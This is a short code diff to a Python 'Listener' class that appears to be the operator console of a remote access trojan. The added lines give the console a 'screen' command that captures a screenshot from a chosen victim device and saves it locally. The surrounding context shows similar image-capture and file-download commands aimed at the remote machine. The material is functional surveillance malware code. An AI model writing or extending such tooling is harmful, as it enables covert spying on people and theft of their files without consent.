@@ -156,6 +156,15 @@ class Listener:
 						self.write_file("one.jpg", res)
 				else: print(colored("[~] You have to choose one device", "yellow"))
 
+			elif command.strip() == "screen" or command.strip() == "screenshot":
+				if self.chosen_connection:
+					res = self.execute_remotely("screen")
+					if res.split()[0] == "[-]":
+						print(colored(res, "red"))
+					else:
+						self.write_file("scr.jpg", res)
+				else: print(colored("[~] You have to choose one device", "yellow"))
+
 			elif command.strip() and command.split()[0] == "download":
 				if self.chosen_connection:
 					file = command.replace("download", "").strip()
